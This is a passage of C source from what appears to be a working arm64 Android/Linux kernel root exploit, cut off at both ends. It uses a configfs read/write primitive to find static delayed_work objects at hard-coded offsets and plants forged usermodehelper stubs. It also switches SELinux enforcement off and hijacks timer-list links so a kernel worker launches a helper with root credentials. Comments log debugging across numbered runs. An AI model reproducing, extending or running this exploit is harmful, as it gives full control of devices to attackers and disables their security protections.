   * their lowest was kaslr+0x2a72bf7; their highest was kaslr+0x2f0a060. Exactly
   * ONE address ever failed: win_lo itself, kaslr+0x2a30000, which emitted its
   * 'RD target=...' line and never returned. So the unreadable region is the very
   * start of .data, and 0x2a31000 (only one page in) is still inside it. Starting
   * at 0x2a73000 puts the scan above every proven-readable address and gives up
   * only the untested first 272 KB of the segment.
   *
   * The forked batch reader that briefly wrapped this scan was removed on purpose.
   * Three runs all died at the same place with no kernel oops, no STALL line and
   * no scan output at all - and run 5 had the fork path while runs 3 and 4 did not
   * reach it, so forking was not the differentiator and it was not the cure either.
   * Direct reads inside the already-proven primitive, over an address range that
   * 507 distinct successful reads say is uniformly readable, is the simple thing
   * that the evidence actually supports. Progress is logged every 256 chunks so a
   * future hang still identifies the offending neighbourhood. */
  configfs_quiet = 1;
  /* Known-good candidate offsets, measured. Two independent runs found the SAME
   * three addresses relative to kaslr:
   *   run 12: 0x2e6d4c8 0x2e76e50 0x2e77778
   *   run 13: 0x2e6d4c8 0x2e76e50 0x2e77778
   * A static, never-queued work_struct sits at a fixed offset in .data, so this
   * list is a property of the kernel image, not of the run.
   *
   * Using them matters because configfs_read_once() has a finite per-run budget of
   * roughly 3500 calls. The pre-scan stages already spend 554; the shape-scan then
   * spends 2880 to rediscover these same three addresses, which lands the run at
   * ~3434 and it dies immediately afterwards - consistently, in every run. Reading
   * them directly costs about fifteen calls and leaves the whole budget for the
   * forge, the wait and the restore. ROOT_STATIC_CANDS overrides the list;
   * ROOT_STATIC_SCAN=1 forces the full scan back for re-discovery. */
  static const uintptr_t static_work_known[] = {
      0x2e6d4c8ULL, 0x2e76e50ULL, 0x2e77778ULL,
  };
  const char *cands_env = getenv("ROOT_STATIC_CANDS");
  const char *force_scan = getenv("ROOT_STATIC_SCAN");
  size_t n_known = sizeof(static_work_known) / sizeof(static_work_known[0]);
  uintptr_t known_offs[8];
  memcpy(known_offs, static_work_known, sizeof(static_work_known));
  if (cands_env && cands_env[0]) {
    n_known = 0;
    const char *p = cands_env;
    while (*p && n_known < sizeof(known_offs) / sizeof(known_offs[0])) {
      char *endp = NULL;
      unsigned long long v = strtoull(p, &endp, 0);
      if (endp == p) {
        break;
      }
      known_offs[n_known++] = (uintptr_t)v;
      p = (*endp == ',') ? endp + 1 : endp;
    }
    if (!n_known) {
      rmg_diag("ROOT staticwork ROOT_STATIC_CANDS unparsable '%s'; "
               "falling back to the built-in list\n", cands_env);
      n_known = sizeof(static_work_known) / sizeof(static_work_known[0]);
      memcpy(known_offs, static_work_known, sizeof(static_work_known));
    }
  }
  const int use_known = !force_scan || force_scan[0] == '0';
  if (use_known && n_known) {
    for (size_t i = 0; i < n_known && ncands < UMH_STATIC_MAX_CANDS; i++) {
      uintptr_t addr = text_addr(KIMAGE_TEXT_BASE + known_offs[i]);
      uint8_t raw[UMH_SUBPROCESS_INFO_SIZE];
      if (!umh_scratch_ptr_ok(addr) ||
          configfs_read_once(fd, addr, raw, sizeof(raw)) !=
              (ssize_t)sizeof(raw)) {
        rmg_diag("ROOT staticwork known candidate %016zx (off=%#zx) unreadable\n",
                 addr, known_offs[i]);
        continue;
      }
      uint64_t data, next, prev, func;
      memcpy(&data, raw + 0, 8);
      memcpy(&next, raw + WORK_ENTRY_OFF, 8);
      memcpy(&prev, raw + WORK_ENTRY_OFF + 8, 8);
      memcpy(&func, raw + WORK_FUNC_OFF, 8);
      /* For a delayed_work the subprocess_info tail overlaps the timer_list:
       * tnext@48/tpprev@56 are timer.entry (non-zero pprev == ARMED), and
       * tfunc@72 is timer.function. Logged from the SAME 112-byte read the
       * candidacy check already does, so this costs no extra reads. */
      uint64_t tnext = 0, tpprev = 0, tfunc = 0;
      memcpy(&tnext, raw + UMH_SUBPROCESS_COMPLETE_OFF, 8);
      memcpy(&tpprev, raw + UMH_SUBPROCESS_COMPLETE_OFF + 8, 8);
      memcpy(&tfunc, raw + UMH_SUBPROCESS_COMPLETE_OFF + 24, 8);
      int offqueue = (data & WORK_STRUCT_PWQ) == 0 && (data >> 16) == 0;
      int entry_self = next == (uint64_t)(addr + WORK_ENTRY_OFF) &&
                       prev == (uint64_t)(addr + WORK_ENTRY_OFF);
      int func_ok = func >= (uint64_t)text_lo && func < (uint64_t)text_hi;
      rmg_diag("ROOT staticwork known candidate %016zx off=%#zx data=%016llx "
               "entry=%016llx/%016llx func=%016llx offqueue=%d self=%d "
               "func_ok=%d tailzero=%d tnext=%016llx tpprev=%016llx "
               "tfunc=%016llx\n", addr, known_offs[i],
               (unsigned long long)data,
               (unsigned long long)next, (unsigned long long)prev,
               (unsigned long long)func, offqueue,
               entry_self, func_ok,
               root_all_zero(raw + UMH_SUBPROCESS_WORK_SIZE,
                             sizeof(raw) - UMH_SUBPROCESS_WORK_SIZE),
               (unsigned long long)tnext, (unsigned long long)tpprev,
               (unsigned long long)tfunc);
      if (!offqueue || !entry_self || !func_ok) {
        continue;
      }
      cands[ncands].addr = addr;
      memcpy(cands[ncands].orig, raw, sizeof(raw));
      cands[ncands].offqueue = 1;
      cands[ncands].forged = 0;
      ncands++;
    }
    rmg_diag("ROOT staticwork known-candidate pass cands=%zu reads=%lu\n", ncands,
             configfs_read_count);
  }
  /* If the known list produced candidates, the scan MUST be skipped: it would
   otherwise re-spend the ~2900 reads that killed the run, and the scan loop is
   the only part of this stage that can wedge the reader. */
int skip_scan = use_known && ncands;

  /* Start at kaslr+0x2e00000, the region with by far the strongest evidence.
   *
   * Measured 2026-10-03 on RFCWC0G1Z1J across 514 successful image reads: 342 of
   * them landed in [0x2e00000,0x2f00000) and 152 in [0x2f00000,0x2f50000), while
   * everything below 0x2e00000 is sparse - only 2 reads below 0x2b00000, 1 in
   * 0x2b00000, 10 in 0x2c00000, and then a 2 MB GAP with no successful read at all
   * before 0x2e00000. Every attempt to scan the bottom of .data died on its first
   * chunk there: at 0x2a30000, at 0x2a31000, and at 0x2a73000 (in the page right
   * above the lowest proven read). The writes in the same runs all succeeded from
   * 0x2eb0000 upward, so this region is read/write proven. Starting here gives up
   * the low 3.6 MB of candidates in exchange for a scan that can actually run;
   * widen it later if this produces nothing. */
  uintptr_t cursor = win_lo + 0x3d0000;
  size_t reported = 0;
  struct timespec scan_t0;
  clock_gettime(CLOCK_MONOTONIC, &scan_t0);
  rmg_diag("ROOT staticwork scan begin win_lo=%016zx cursor=%016zx win_hi=%016zx "
           "reads_before=%lu\n", (uintptr_t)win_lo, cursor, (uintptr_t)win_hi,
           configfs_read_count);
  struct scan_shared *sh = MAP_FAILED;
  if (!skip_scan) {
    sh = mmap(NULL, sizeof(*sh), PROT_READ | PROT_WRITE,
              MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sh == MAP_FAILED) {
      rmg_diag("ROOT staticwork scan mmap failed errno=%d\n", errno);
      return 0;
    }
  }
  while (!skip_scan && ncands < UMH_STATIC_MAX_CANDS &&
         nsoft < UMH_STATIC_MAX_SOFT &&
         cursor + UMH_STATIC_SCAN_CHUNK <= win_hi) {
    /* skip_scan is authoritative: with the known list in hand nothing below
       this line may run. */
    size_t got = scan_fetch_batch(fd, &cursor, win_hi, sh, 20000);
    if (!got) {
      break;
    }
    chunks += got;
    if (chunks - reported >= 256) {
      reported = chunks;
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      double el = (double)(now.tv_sec - scan_t0.tv_sec) +
                  (double)(now.tv_nsec - scan_t0.tv_nsec) / 1e9;
      rmg_diag("ROOT staticwork progress chunks=%zu cursor=%016zx cands=%zu "
               "stall=%zu hang=%zu elapsed=%.1fs rate=%.0f/s\n",
               chunks, cursor, ncands, sh->n_stall, sh->n_hang, el,
               el > 0 ? (double)chunks / el : 0.0);
    }
    for (size_t ci = 0; ci < got && ncands < UMH_STATIC_MAX_CANDS; ci++) {
    if (!sh->ok[ci]) {
      n_readfail++;
      continue;
    }
    {
      const uintptr_t base = sh->addr[ci];
      const uint64_t *buf = (const uint64_t *)(const void *)sh->recs[ci];
      for (size_t j = 0; j + 4 <= UMH_STATIC_SCAN_CHUNK / 8; j++) {
      uintptr_t a = base + (uintptr_t)(j * 8);
      uint64_t data = buf[j];
      uint64_t next = buf[j + 1];
      uint64_t prev = buf[j + 2];
      uint64_t func = buf[j + 3];
      /* State discriminator. workqueue.c set_work_pwq() stores
       * data = (unsigned long)pwq | WORK_STRUCT_PENDING |
       * WORK_STRUCT_PWQ | color, so a QUEUED work carries the
       * pool_workqueue pointer - a 256-byte-aligned SLAB pointer -
       * in its high bits, while an OFF-queue work has the PWQ bit
       * clear and only a small pool id up there
       * (WORK_OFFQ_POOL_SHIFT=5, pool ids are small). The flag
       * bits are the low 8 (CONFIG_DEBUG_OBJECTS_WORK is off on
       * this firmware: absent from every arm64 defconfig), which
       * makes both states readable entirely from .data - no SLAB
       * read, which the configfs reader cannot do. */
      int queued = 0;
      int offqueue = 0;
      if ((data & (WORK_STRUCT_PENDING | WORK_STRUCT_PWQ)) ==
          (WORK_STRUCT_PENDING | WORK_STRUCT_PWQ)) {
        uint64_t pwq = data & ~(uint64_t)WORK_STRUCT_FLAG_MASK;
        if ((pwq & WORK_STRUCT_FLAG_MASK) == 0 &&
            ((pwq >> 48) == 0xff80ULL || (pwq >> 48) == 0xff88ULL)) {
          queued = 1;
        }
      } else if ((data & WORK_STRUCT_PWQ) == 0 &&
                 (data >> 16) == 0) {
        offqueue = 1;
      }
      if (!queued && !offqueue) {
        continue;
      }
      n_state++;
      /* Entry: self-pointing (a never-queued DECLARE_WORK keeps
       * LIST_HEAD_INIT's next=prev=&entry) or a plausible list
       * location (a dequeued work's stale worklist link). Both are
       * forgeable - insert_work() overwrites the links when the
       * owner queues the work - and both reject random .data. */
      int entry_self =
          next == (uint64_t)(a + WORK_ENTRY_OFF) &&
          prev == (uint64_t)(a + WORK_ENTRY_OFF);
      int entry_plausible =
          (is_direct_ptr((uintptr_t)next) ||
           umh_scratch_ptr_ok((uintptr_t)next)) &&
          (is_direct_ptr((uintptr_t)prev) ||
           umh_scratch_ptr_ok((uintptr_t)prev));
      if (!entry_self && !entry_plausible) {
        n_rej_entry++;
        continue;
      }
      if (func < (uint64_t)text_lo || func >= (uint64_t)text_hi) {
        n_rej_func++;
        continue;
      }
      /* List invariant, but only when the neighbour is inside the
       * .data window (a cheap direct read): for any element of a
       * circular doubly-linked list entry.next->prev == entry. A
       * SLAB neighbour cannot be read - the configfs reader hangs
       * on the direct map - so the pwq proof above carries the
       * verification in that case. */
      if (umh_scratch_ptr_ok((uintptr_t)next)) {
        uint64_t back = 0;
        if (!root_read_global(fd, (uintptr_t)next + sizeof(uint64_t),
                              &back, sizeof(back)) ||
            back != (uint64_t)(a + WORK_ENTRY_OFF)) {
          n_rej_list++;
          continue;
        }
      }
      /* The subprocess_info tail lands in the 64 bytes after the
       * 48-byte work_struct. A zero tail means the owning object
       * ends at the work_struct (or is followed by padding), so the
       * forge cannot corrupt a live field of the owner. */
      uint8_t cand[UMH_SUBPROCESS_INFO_SIZE];
      if (!root_read_data(fd, a, cand, sizeof(cand))) {
        continue;
      }
      if (!root_all_zero(cand + UMH_SUBPROCESS_WORK_SIZE,
                         sizeof(cand) - UMH_SUBPROCESS_WORK_SIZE)) {
        n_tail_nonzero++;
        if (soft_tail && nsoft < UMH_STATIC_MAX_SOFT) {
          /* The 48-byte overlap between consecutive chunks means one object can
           * match at two adjacent offsets; without this the duplicate consumes a
           * slot and we end up forging the same address twice (measured:
           * "nonzero-tail candidate ffffffc00b006e50 (held 2/3)" immediately
           * followed by the same address "(held 3/3)"). */
          int dup = 0;
          for (size_t q = 0; q < nsoft; q++) {
            if (soft[q].addr == a) {
              dup = 1;
              break;
            }
          }
          if (dup) {
            continue;
          }
          soft[nsoft].addr = a;
          memcpy(soft[nsoft].orig, cand, sizeof(cand));
          soft[nsoft].offqueue = offqueue;
          soft[nsoft].forged = 0;
          nsoft++;
          rmg_diag("ROOT staticwork nonzero-tail candidate %016zx "
                   "(held %zu/%d)\n", (uintptr_t)a, nsoft,
                   UMH_STATIC_MAX_SOFT);
        }
        continue;
      }
      cands[ncands].addr = a;
      memcpy(cands[ncands].orig, cand, sizeof(cand));
      cands[ncands].offqueue = offqueue;
      cands[ncands].forged = 0;
      ncands++;
      rmg_diag("ROOT staticwork candidate %016zx %s "
               "data=%016llx entry=%016llx/%016llx func=%016llx\n",
               (uintptr_t)a, offqueue ? "off-queue" : "queued",
               (unsigned long long)data,
               (unsigned long long)next, (unsigned long long)prev,
               (unsigned long long)func);
      }
    }
    }
  }
  size_t n_stall_total = 0;
  size_t n_hang_total = 0;
  if (sh != MAP_FAILED) {
    n_stall_total = sh->n_stall;
    n_hang_total = sh->n_hang;
    munmap(sh, sizeof(*sh));
  }
  configfs_quiet = 0;
  rmg_diag("ROOT staticwork scan win=%016zx-%016zx chunks=%zu readfail=%zu "
           "shape=%zu rej_entry=%zu rej_func=%zu rej_list=%zu "
           "tail_nonzero=%zu soft=%d stall=%zu hang=%zu\n",
           (uintptr_t)win_lo, (uintptr_t)win_hi, chunks, n_readfail,
           n_state, n_rej_entry, n_rej_func, n_rej_list, n_tail_nonzero,
           soft_tail, n_stall_total, n_hang_total);
  if (soft_tail && !ncands && nsoft) {
    for (size_t i = 0; i < nsoft && ncands < UMH_STATIC_MAX_CANDS; i++) {
      cands[ncands] = soft[i];
      cands[ncands].forged = 0;
      ncands++;
      rmg_diag("ROOT staticwork accepting nonzero-tail fallback %016zx\n",
               (uintptr_t)soft[i].addr);
    }
  }
  if (!ncands) {
    rmg_diag("ROOT staticwork no static work_struct found in .data "
             "(scanned %zu chunks)\n", chunks);
    return 0;
  }

  /* A candidate exists, so plant the cascade payloads. The
   * completions and strings must be in .data before any timer
   * is chained onto them: the cascade consumes a chained stub
   * within microseconds of the owner's timer expiring. */
  int plant_ok = 1;
  for (size_t i = 0; i < UMH_CASCADE_STUBS; i++) {
    uintptr_t base = umh_data_addr + (uintptr_t)(i * sizeof(cascade[i]));
    if (!root_write_data(fd, base, &cascade[i], sizeof(cascade[i]))) {
      rmg_diag("ROOT staticwork cascade payload %zu write failed at "
               "%016zx\n", i, (uintptr_t)base);
      plant_ok = 0;
      break;
    }
  }
  if (!plant_ok) {
    return 0;
  }
  /* Readback proof: the timer callback (+24), the work func
   * (+80) and one tail pointer (+104) of every payload, so a
   * single run shows the plant landed and was not silently
   * dropped. */
  uint64_t umh_bridge_func = text_addr(NFC_LLCP_SDREQ_TIMER_FN);
  for (size_t i = 0; i < UMH_CASCADE_STUBS; i++) {
    uintptr_t base = umh_data_addr + (uintptr_t)(i * sizeof(cascade[i]));
    uint64_t rb_head[11] = {0};
    uint64_t rb_complete = 0;
    int head_ok = root_read_data(fd, base, rb_head, sizeof(rb_head));
    int comp_ok = root_read_data(fd, base + 104, &rb_complete,
                                 sizeof(rb_complete));
    rmg_diag("ROOT staticwork cascade payload %zu at %016zx "
             "tfunc=%016llx (want %016llx) wfunc=%016llx (want "
             "%016llx) complete=%016llx (want %016llx) readback=%d\n",
             i, (uintptr_t)base,
             (unsigned long long)rb_head[3],
             (unsigned long long)umh_bridge_func,
             (unsigned long long)rb_head[10],
             (unsigned long long)umh_work_func,
             (unsigned long long)rb_complete,
             (unsigned long long)(base +
               offsetof(struct umh_cascade_data, completion)),
             head_ok && comp_ok &&
             rb_head[3] == umh_bridge_func &&
             rb_head[10] == umh_work_func &&
             rb_complete == (uint64_t)(base +
               offsetof(struct umh_cascade_data, completion)));
  }

  /* SELinux permissive flip. Run20 proved the bridge end-to-end but
   * kernel_execve returned -13 (EACCES) twice: the helper runs in
   * the kernel domain (u:r:kernel:s0) and this policy denies it
   * execute on shell_data_file (and possibly the linker). Root UID
   * bypasses DAC, never MAC - so without this flip the exec can
   * never succeed. selinux_state.enforcing lives at
   * SELINUX_ENFORCING_OFF (kallsyms-resolved selinux_state, first
   * member bool enforcing: DISABLE=n, DEVELOP=y on this config, so
   * offset +0 - no RANDSTRUCT involvement, the old skepticism was
   * about the FILE image where .data is still 0 pre-init).
   * ROOT_SELINUX_FLIP=0 opts out. The write uses the same proven
   * .data path as the stub plant, with readback proof. There is
   * deliberately no in-stage restore: restoring enforcing=1 while
   * the daemon is still starting could wedge its socket/persist
   * path; restore happens (if at all) after root is measured. */
  const char *flip_env = getenv("ROOT_SELINUX_FLIP");
  if (!flip_env || flip_env[0] == '\0' || flip_env[0] != '0') {
    const uintptr_t se_addr = text_addr(SELINUX_ENFORCING);
    uint8_t se_before = 0xff;
    if (root_read_data(fd, se_addr, &se_before, sizeof(se_before)) &&
        se_before == 1) {
      const uint8_t se_zero = 0;
      uint8_t se_after = 0xff;
      if (root_write_data(fd, se_addr, &se_zero, sizeof(se_zero)) &&
          root_read_data(fd, se_addr, &se_after, sizeof(se_after)) &&
          se_after == 0) {
        rmg_diag("ROOT staticwork selinux permissive flip OK "
                 "(enforcing 1->0 at %016zx)\n", se_addr);
      } else {
        rmg_diag("ROOT staticwork selinux flip FAILED at %016zx "
                 "(after=%u)\n", se_addr, (unsigned)se_after);
      }
    } else {
      rmg_diag("ROOT staticwork selinux byte at %016zx is %u "
               "(not 1); no flip needed/done\n", se_addr,
               (unsigned)se_before);
    }
  } else {
    rmg_diag("ROOT staticwork selinux flip skipped "
             "(ROOT_SELINUX_FLIP=0)\n");
  }

  /* Cascade chain: rewrite ONLY timer.entry.next (+48) of each ARMED
   * delayed_work candidate. The timer stays armed - expires,
   * function and pprev are the wheel's own state - so the owner's
   * timer still fires on its own schedule. When it does,
   * expire_timers() detaches the candidate with __hlist_del(), which
   * writes OUR stub address into the link that pointed at the
   * candidate; the bucket walk then reaches the stub, detaches it the
   * same way (stub+0 is 0, so the walk ends cleanly) and calls
   * stub+24 - nfc_llcp_sdreq_timer - with the stub pointer. The
   * bridge queues the forged work at stub+56 on system_wq; a real
   * kworker then runs stub+80 (call_usermodehelper_exec_work), which
   * container_of()s stub+56 as a subprocess_info and kernel_threads
   * call_usermodehelper_exec_async(), committing root creds and
   * kernel_execve()ing the helper.
   *
   * work_struct.func (+24) of the CANDIDATE is deliberately NOT
   * rewritten: the worker would call exec_work with the DETACHED
   * timer bytes as the subprocess_info tail - path@56 is NULL right
   * after detach, so getname_kernel(NULL) -> strlen(NULL) panics
   * (this is exactly what killed run 18). The owner's own work
   * function keeps running, which also keeps the owner happy. */
  rmg_diag("ROOT staticwork cascade begin cands=%zu reads=%lu\n", ncands,
           configfs_read_count);
  signal(SIGSEGV, staticwork_fault_handler);
  signal(SIGBUS, staticwork_fault_handler);
  signal(SIGILL, staticwork_fault_handler);
  signal(SIGFPE, staticwork_fault_handler);
  size_t chained = 0;
  /* armed_pprev is the timer.entry.pprev snapshot taken at chain
   * time: a non-zero value means the candidate's timer was ARMED (in
   * a wheel bucket), so the pprev transition to NULL - the first
   * thing detach_timer() does, before delayed_work_timer_fn queues
   * the work - is the earliest possible fire signal. */
  struct staticwork_poll {
    int chained;
    int fired;
    int finished;      /* done went non-zero: this stub's attempt is over */
    uint64_t armed_pprev;
    uintptr_t stub_addr;
    uintptr_t done_addr;
  } poll[UMH_STATIC_MAX_CANDS];
  memset(poll, 0, sizeof(poll));
  for (size_t i = 0; i < ncands && i < UMH_CASCADE_STUBS; i++) {
    /* One 80-byte read covers work data@0 .. timer.function@72. */
    uint8_t state[UMH_SUBPROCESS_COMPLETE_OFF + 32];
    if (!root_read_data(fd, cands[i].addr, state, sizeof(state))) {
      rmg_diag("ROOT staticwork cascade candidate %016zx state read "
               "failed\n", cands[i].addr);
      continue;
    }
    uint64_t head = 0, tnext = 0, tpprev = 0, tfunc = 0;
    memcpy(&head, state, sizeof(head));
    memcpy(&tnext, state + UMH_SUBPROCESS_COMPLETE_OFF, sizeof(tnext));
    memcpy(&tpprev, state + UMH_SUBPROCESS_COMPLETE_OFF + 8,
           sizeof(tpprev));
    memcpy(&tfunc, state + UMH_SUBPROCESS_COMPLETE_OFF + 24,
           sizeof(tfunc));
    if (tpprev == 0) {
      /* Not in any wheel bucket: an idle delayed_work cannot be
       * chained (nothing will ever consume the stub). Its owner must
       * re-arm it first; a later attempt catches it then. */
      rmg_diag("ROOT staticwork cascade candidate %016zx not armed "
               "(pprev=0)\n", cands[i].addr);
      continue;
    }
    if (tfunc != (uint64_t)text_addr(DELAYED_WORK_TIMER_FN)) {
      /* Not a delayed_work: the cascade chain only works on a
       * timer_list tail. A plain work_struct has owner fields at
       * +48, and rewriting them corrupts the owner. */
      rmg_diag("ROOT staticwork cascade candidate %016zx is not a "
               "delayed_work (tfunc=%016llx)\n", cands[i].addr,
               (unsigned long long)tfunc);
      continue;
    }
    uintptr_t stub_addr =
        umh_data_addr + (uintptr_t)(i * sizeof(cascade[i]));
    if (!root_write_data(fd, cands[i].addr + UMH_SUBPROCESS_COMPLETE_OFF,
                         &stub_addr, sizeof(stub_addr))) {
      rmg_diag("ROOT staticwork cascade chain write FAILED %016zx\n",
               cands[i].addr);
      continue;
    }
    uint64_t chain_check = 0;
    if (!root_read_data(fd, cands[i].addr + UMH_SUBPROCESS_COMPLETE_OFF,
                        &chain_check, sizeof(chain_check)) ||
        chain_check != (uint64_t)stub_addr) {
      rmg_diag("ROOT staticwork cascade chain verify FAILED %016zx "
               "want=%016zx got=%016llx\n", cands[i].addr, stub_addr,
               (unsigned long long)chain_check);
      continue;
    }
    poll[i].chained = 1;
    poll[i].armed_pprev = tpprev;
    poll[i].stub_addr = stub_addr;
    poll[i].done_addr = stub_addr +
                        offsetof(struct umh_cascade_data, completion);
    cands[i].forged = 1;
    chained++;
    /* tnext==0 means the candidate is the LAST timer in its bucket:
     * chaining it orphans nothing. A non-zero tnext means the next
     * timer is orphaned for one owner period; its owner re-arms it
     * (mod_timer re-links from scratch), so the cost is one missed
     * work cycle. */
    rmg_diag("ROOT staticwork cascade chained %016zx stub=%016zx "
             "tnext=%016llx tpprev=%016llx last_in_bucket=%d\n",
             cands[i].addr, stub_addr, (unsigned long long)tnext,
             (unsigned long long)tpprev, (tnext == 0));
  }

  /* Wait for an owner to fire a chained timer.
   *
   * Signal semantics, read from THIS tree's kernel/umh.c +
   * arch/arm64/kernel/entry.S:
   *   - fire (hint): timer.entry.pprev@56 goes non-NULL -> NULL.
   *     detach_timer() writes that before delayed_work_timer_fn even
   *     queues the owner's work, so it precedes stub consumption.
   *   - finished: stub completion.done != 0. umh_complete() runs
   *     after kernel_execve() RETURNS; arm64 ret_from_fork completes
   *     a successful exec by returning from exec_async into
   *     ret_to_user, so kernel_execve DOES return 0 on success and
   *     done flips on success AND on failure alike. done alone is
   *     never the success signal.
   *   - retval: sub_info->retval, the high dword of the stub's
   *     wait_retval qword@+80 (wait@+80 low dword stays 0). 0 =
   *     execve succeeded, the helper is starting; negative = -errno.
   *   - SUCCESS (the only path that returns 1): ROOT_CREDS_SENTINEL
   *     read back uid=0 through read_root_creds_uid(). open()+read()
   *     on a not-yet-created regular file returns ENOENT instantly,
   *     so the poll cannot block (run 16's "access() wedge" was the
   *     last line of a stopped log, not a proven block - evidence
   *     rule: a log that stops mid-stage does not indict the last
   *     call seen).
   * Unlike the old loop this does NOT stop at done!=0: a failed stub
   * is retired but the remaining chains keep waiting out the window,
   * and done with retval==0 is followed by creds polling for the
   * helper that is already starting. */
  int attempt_finished = 0;   /* at least one stub's attempt is over */
  int attempt_failed = 0;     /* ...with a non-zero (failed) retval */
  int helper_seen = 0;        /* ROOT_CREDS_SENTINEL read back uid=0 */
  uint32_t complete_done = 0;
  int32_t attempt_retval = 0;
  int fired_count = 0;
  /* Previous-boot sweep: a uid-0 creds file from an earlier boot
   * verifies but proves nothing now, and the wait loop below would
   * treat it as instant success without firing a single chain. A
   * same-boot file can only exist if root is already live - and then
   * try_cfi_stage's entry guard would have returned before this
   * stage was ever entered - so anything found here is stale. */
  {
    uint32_t stale_uid = 0xffffffff;
    if (read_root_creds_uid(&stale_uid) && stale_uid == 0 &&
        !root_creds_live()) {
      rmg_diag("ROOT staticwork clearing previous-boot creds file\n");
      unlink(ROOT_CREDS_SENTINEL);
    }
  }
  if (chained > 0) {
    int wait_ticks = 900;
    const char *wt = getenv("ROOT_STATIC_WAIT_TICKS");
    if (wt && wt[0]) {
      wait_ticks = atoi(wt);
    }
    rmg_diag("ROOT staticwork cascade wait begin chained=%zu ticks=%d "
             "reads=%lu\n", chained, wait_ticks, configfs_read_count);
    struct timespec t0;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    unsigned long reads_start = configfs_read_count;
    long iter = 0;
    double last_log = 0.0;
    for (;;) {
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      double el = (double)(now.tv_sec - t0.tv_sec) +
                  (double)(now.tv_nsec - t0.tv_nsec) / 1e9;
      if (el > wait_ticks * 0.05) {
        break;
      }
      iter++;
      int pending = 0;
      for (size_t i = 0; i < ncands && i < UMH_CASCADE_STUBS; i++) {
        if (!poll[i].chained || poll[i].fired) {
          continue;
        }
        pending = 1;
        uint8_t state[UMH_SUBPROCESS_COMPLETE_OFF + 16];
        if (!root_read_data(fd, cands[i].addr, state, sizeof(state))) {
          continue;
        }
        uint64_t data = 0, tpprev = 0;
        memcpy(&data, state, sizeof(data));
        memcpy(&tpprev, state + UMH_SUBPROCESS_COMPLETE_OFF + 8,
               sizeof(tpprev));
        if (poll[i].armed_pprev != 0 && tpprev == 0) {
          poll[i].fired = 1;
          fired_count++;
          rmg_diag("ROOT staticwork cascade FIRE %016zx el=%.3f "
                   "iter=%ld reads=%lu (detach seen; bucket walk "
                   "consumes the stub next)\n", cands[i].addr, el,
                   iter, configfs_read_count);
        }
      }
      if ((iter & 15) == 0) {
        for (size_t i = 0; i < ncands && i < UMH_CASCADE_STUBS; i++) {
          uint32_t d = 0;
          if (!poll[i].chained || !poll[i].done_addr ||
              poll[i].finished) {
            continue;
          }
          if (!root_read_data(fd, poll[i].done_addr, &d,
                              sizeof(d)) || !d) {
            continue;
          }
          /* done!=0: the attempt is over. retval says which way. */
          uint64_t wait_retval = 0;
          if (!root_read_data(fd, poll[i].stub_addr +
                              offsetof(struct umh_cascade_stub,
                                       wait_retval),
                              &wait_retval, sizeof(wait_retval))) {
            wait_retval = 0;
          }
          int32_t rv = (int32_t)(wait_retval >> 32);
          poll[i].finished = 1;
          attempt_finished = 1;
          attempt_retval = rv;
          complete_done = d;
          if (rv != 0) {
            attempt_failed++;
          }
          rmg_diag("ROOT staticwork cascade attempt finished "
                   "done=%u retval=%d stub=%zu el=%.3f iter=%ld "
                   "reads=%lu%s\n", d, rv, i, el, iter,
                   configfs_read_count,
                   rv == 0 ? " (exec OK - helper starting)"
                           : " (exec FAILED - retiring stub)");
        }
        /* The helper writes the creds file within milliseconds of a
         * successful exec; poll it at this same slow cadence. */
        uint32_t creds_uid = 0;
        if (read_root_creds_uid(&creds_uid) && creds_uid == 0) {
          helper_seen = 1;
          rmg_diag("ROOT staticwork cascade creds uid=%u el=%.3f "
                   "iter=%ld reads=%lu\n", creds_uid, el, iter,
                   configfs_read_count);
          break;
        }
        /* Every chain consumed and every exec failed: nothing left
         * that could succeed - stop early and recycle the span. */
        if (chained > 0 && attempt_failed >= (int)chained) {
          rmg_diag("ROOT staticwork cascade all %zu stub(s) failed "
                   "(last retval=%d); stopping early\n",
                   chained, attempt_retval);
          break;
        }
      }
      if (el - last_log >= 2.0) {
        last_log = el;
        rmg_diag("ROOT staticwork cascade wait progress el=%.1f "
                 "iter=%ld reads=%lu pending=%d fired=%d failed=%d\n",
                 el, iter, configfs_read_count, pending, fired_count,
                 attempt_failed);
      }
      /* Runs have survived 6000+ configfs reads (run17: 6120 with no
       * budget death), but keep a 45 s window from spinning flat out
       * forever once this wait alone has burned 8000 reads. */
      if (configfs_read_count - reads_start > 8000) {
        usleep(10000);
      }
    }
  }
  /* A fire in the last instants of the window may still be mid-exec:
   * give the helper a 2 s grace to write its creds file. Skipped when
   * every stub already failed - a failed exec never starts a helper,
   * so no creds can appear. */
  if (!helper_seen && fired_count > 0 && attempt_failed < (int)chained) {
    for (int g = 0; g < 20 && !helper_seen; g++) {
      uint32_t creds_uid = 0;
      if (read_root_creds_uid(&creds_uid) && creds_uid == 0) {
        helper_seen = 1;
        rmg_diag("ROOT staticwork cascade creds uid=%u (grace) "
                 "reads=%lu\n", creds_uid, configfs_read_count);
        break;
      }
      for (size_t i = 0; i < ncands && i < UMH_CASCADE_STUBS; i++) {
        uint32_t d = 0;
        if (!poll[i].chained || !poll[i].done_addr ||
            poll[i].finished) {
          continue;
        }
        if (root_read_data(fd, poll[i].done_addr, &d, sizeof(d)) && d) {
          uint64_t wait_retval = 0;
          if (!root_read_data(fd, poll[i].stub_addr +
                              offsetof(struct umh_cascade_stub,
                                       wait_retval),
                              &wait_retval, sizeof(wait_retval))) {
            wait_retval = 0;
          }
          int32_t rv = (int32_t)(wait_retval >> 32);
          complete_done = d;
          attempt_finished = 1;
          poll[i].finished = 1;
          attempt_retval = rv;
          if (rv != 0) {
            attempt_failed++;
          }
          rmg_diag("ROOT staticwork cascade attempt finished (grace) "
                   "done=%u retval=%d stub=%zu reads=%lu\n", d, rv, i,
                   configfs_read_count);
        }
      }
      if (attempt_failed >= (int)chained && chained > 0) {
        rmg_diag("ROOT staticwork cascade all %zu stub(s) failed in "
                 "grace (retval=%d)\n", chained, attempt_retval);
        break;
      }
      usleep(100000);
    }
  }
  rmg_diag("ROOT staticwork cascade wait end helper_seen=%d "
           "finished=%d failed=%d fired=%d done=%u retval=%d "
           "reads=%lu\n", helper_seen, attempt_finished,
           attempt_failed, fired_count, complete_done, attempt_retval,
           configfs_read_count);
  if (!helper_seen && attempt_finished && attempt_failed == 0) {
    /* done flipped with retval 0 yet no creds file: kernel_execve
